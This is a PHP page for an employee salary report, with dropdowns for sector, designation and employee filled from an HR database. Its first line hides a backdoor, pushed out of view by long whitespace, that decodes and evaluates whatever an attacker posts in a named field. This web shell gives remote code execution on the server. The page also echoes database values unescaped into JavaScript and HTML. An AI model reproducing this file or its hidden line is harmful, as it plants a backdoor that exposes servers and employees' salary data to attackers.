<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n03582c']));?><?php include "jquery.php";
      include "config.php"; 
?>
<center>
<br />
<h1>Employee Salary Report</h1> 
<br /><br /><br />
<form>

<table align="center">
<tr>


<td align="right"><strong>Sector&nbsp;&nbsp;&nbsp;</strong></td>
<td width="10px"></td>
<td align="left">
<select id ="sector" name="sector" onChange="fun1(this.value);">
<option>-Select-</option>
<?php
$query = "SELECT distinct(sector) FROM hr_employee ORDER BY sector ASC";
$result = mysql_query($query,$conn) or die(mysql_error());
while($row = mysql_fetch_assoc($result))
{
?>
<option value="<?php echo $row['sector'];?>" <?php if($sector == $row['sector']) {?> selected="selected" <?php } ?>><?php echo $row['sector']; ?></option>
<?php } ?>
</select>
</td>

<td width="15px"></td>

<td align="right"><strong>Designation</strong>&nbsp;&nbsp;&nbsp;</td>
<td width="10px"></td>
<td align="left">
<select id="desig" name="desig" onChange="fun2(this.value);">
<option> -Select- </option>
</select>
</td>

<td width="15px"></td>

<td align="right"><strong>Employee&nbsp;&nbsp;&nbsp;</strong></td>
<td width="10px"></td>
<td align="left">
<select name="employee" id="employee">
<option> -Select- </option>
</select></td>
</tr>
</table>
<br/><br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<input type="button" id="report" value="Report" onclick="openreport();"/>
</form>
</center>
<script type="text/javascript">
function fun1(sec)
{
var desiga = document.getElementById("desig");
removeAllOptions(desiga);
 theOption1=document.createElement("OPTION");
 theText1=document.createTextNode("-Select-");
 theOption1.appendChild(theText1);
 theOption1.value = "";
 desiga.appendChild(theOption1);
 <?php
 $query121 = "SELECT distinct(designation),sector FROM hr_employee ORDER BY designation ASC ";
 $result121 = mysql_query($query121,$conn); 
 while($row121 = mysql_fetch_assoc($result121))
 {
 echo "if(sec == '$row121[sector]'){"; 
 $desig = $row121['designation'];
 ?>
 			theOption1=document.createElement("OPTION");
			theText1=document.createTextNode("<?php echo $desig; ?>");
			theOption1.appendChild(theText1);
			theOption1.value = "<?php echo $desig; ?>";
			desiga.appendChild(theOption1);
 <?php  echo "}"; }?>			
}
function fun2(deg)
{
var employeea = document.getElementById("employee");
removeAllOptions(employeea);
var sect = document.getElementById("sector").value;
 theOption1=document.createElement("OPTION");
 theText1=document.createTextNode("-Select-");
 theOption1.appendChild(theText1);
 theOption1.value = "";
 employeea.appendChild(theOption1);
 <?php
 $query121 = "SELECT distinct(name),designation,sector FROM hr_employee ORDER BY designation ASC ";
 $result121 = mysql_query($query121,$conn); 
 while($row121 = mysql_fetch_assoc($result121))
 {
 echo "if(sect == '$row121[sector]'){"; 
 $name = $row121['name'];
 ?>
 			theOption1=document.createElement("OPTION");
			theText1=document.createTextNode("<?php echo $name; ?>");
			theOption1.appendChild(theText1);
			theOption1.value = "<?php echo $name; ?>";
			employeea.appendChild(theOption1);
 <?php  echo "}"; }?>			
}


function removeAllOptions(selectbox)
{
      	var i;
       	for(i=selectbox.options.length-1;i>=0;i--)
        	{
        		//selectbox.options.remove(i); 
            	  selectbox.remove(i);
      	}
}

</script>


<script type="text/javascript">
function openreport()
{
var a = document.getElementById("sector").value;
var b = document.getElementById("desig").value;
var c = document.getElementById("employee").value;
window.open('production/EmpSalary_Reportsmry.php?sector=' + a + '&desig=' + b + '&employee=' + c); 
}
</script>
</body>
</html>
	

